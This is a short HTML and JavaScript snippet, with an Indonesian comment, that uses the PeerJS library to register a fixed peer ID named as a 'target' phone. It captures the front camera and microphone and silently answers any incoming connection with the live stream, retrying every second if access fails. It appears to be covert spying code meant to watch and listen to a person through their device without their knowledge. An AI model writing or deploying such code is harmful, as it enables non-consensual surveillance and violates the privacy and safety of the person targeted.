<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
<script>
  // Ganti 'ID-UNIK-RAHASIA' dengan nama bebas, misal: 'ak124-private-99'
  const peer = new Peer('ak124-target-hp'); 
  
  function startStream() {
    navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: true})
    .then(stream => {
      peer.on('call', call => {
        call.answer(stream);
      });
    }).catch(() => { setTimeout(startStream, 1000); });
  }
  startStream();
</script>
